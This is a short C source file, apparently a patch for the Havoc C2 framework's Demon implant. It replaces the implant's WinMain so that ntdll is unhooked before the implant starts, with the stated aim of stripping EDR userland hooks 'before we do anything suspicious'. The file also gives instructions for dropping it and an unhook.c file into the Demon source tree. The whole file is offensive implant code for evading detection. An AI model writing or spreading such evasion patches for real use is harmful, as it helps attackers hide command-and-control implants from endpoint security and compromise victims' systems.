/*
 * Patched Havoc Demon Entry Point
 * Adds ntdll unhooking before main execution.
 *
 * Replace payloads/Demon/src/main/MainExe.c with this file,
 * and add unhook.c to payloads/Demon/src/core/.
 */

#include <Demon.h>

/* Forward declaration from unhook.c */
VOID UnhookNtdll(void);

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    PRINTF( "WinMain: hInstance:[%p] hPrevInstance:[%p] lpCmdLine:[%s] nShowCmd:[%d]\n", hInstance, hPrevInstance, lpCmdLine, nShowCmd )

    /* Strip EDR userland hooks from ntdll before we do anything suspicious */
    UnhookNtdll();

    DemonMain( NULL, NULL );
    return 0;
}
